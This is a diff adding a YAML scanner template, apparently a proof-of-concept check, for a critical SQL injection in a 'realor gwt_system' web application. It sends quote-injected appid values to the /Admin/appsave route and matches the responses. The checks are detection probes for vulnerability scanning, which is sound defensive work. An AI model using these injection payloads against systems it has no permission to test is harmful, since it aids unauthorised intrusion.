@@ -1,0 +1,33 @@
+name: yaml-poc-realor-gwt_system-sql_injection-CT-1251010
+binding: 0920389b-46b3-4247-9121-05d49e1a8d5f
+manual: false
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: CT-1251010
+        level: critical
+    warning: Harmless
+transport: http
+payloads:
+    payloads:
+        file0:
+            path: |
+                "index.php"
+        file1:
+            path: |
+                "hmrao.php"
+rules:
+    r0:
+        request:
+            cache: false
+            method: GET
+            path: /{{path}}?s=/Admin/appsave&appid=3'
+            no_cookie: true
+        expression: response.status == 404 && response.headers['set-cookie'].contains('think_language')
+    r1:
+        request:
+            cache: false
+            method: GET
+            path: /{{path}}?s=/Admin/appsave&appid=3'-'
+        expression: response.status == 200 && response.body_string.contains('appInfo')
+expression: r0() && r1()
